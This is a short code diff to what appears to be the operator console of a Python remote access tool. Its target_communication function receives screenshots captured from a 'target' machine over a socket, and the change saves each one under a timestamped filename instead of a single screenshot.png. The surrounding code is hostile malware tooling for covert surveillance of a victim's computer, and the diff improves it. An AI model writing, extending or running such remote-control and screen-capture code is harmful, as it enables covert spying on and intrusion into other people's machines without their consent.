@@ -5,6 +5,7 @@
 
 # Import necessary libraries
 import base64
+import datetime  # For timestamping
 import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
@@ -92,9 +93,13 @@ def target_communication():
         elif command == 'screenshot':
             # If the user enters 'screenshot', send a command to take a screenshot on the target.
             shot = reliable_recv()
-            if shot:
-                with open('screenshot.png', 'wb') as f:
-                    f.write(base64.b64decode(shot))
+            image_data = base64.b64decode(shot)
+            if image_data:
+                # Format timestamp
+                timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
+                filename = f'screenshot_{timestamp}.png' # filename format
+                with open(filename, 'wb') as f:
+                    f.write(image_data)
                 # If the screenshot command is successful, print the result.
                 print('[+] Screenshot taken successfully.')
             else:
